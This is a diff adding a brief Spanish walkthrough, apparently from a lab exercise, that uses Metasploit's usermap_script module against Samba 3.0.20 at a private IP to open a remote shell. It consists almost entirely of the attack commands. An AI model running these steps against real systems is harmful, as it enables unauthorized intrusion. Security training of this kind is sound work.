@@ -1,0 +1,35 @@
+## Abrimos una terminal y corremos
+
+sudo msfdb run
+
+## Una vez cargado ponemos 
+
+use auxiliary/scanner/smb/smb_version 
+
+## Nos dara la version y procedemos a buscar en otra terminal esto 
+
+searchsploit samba | grep 3.0.20
+
+## En metasploit ponemos 
+
+search samba map 
+
+## y seleccionamos el unico que sale 
+
+use 0
+
+## si te sale mas el que necesitamos es este 
+
+use exploit/multi/samba/usermap_script
+
+## Una vez ya seleccionado mandamos la ip 
+
+set rhosts 192.168.0.38 
+
+## y le damos run
+
+run 
+
+##y no abrira una shell y listo estamos dentro 
+
+
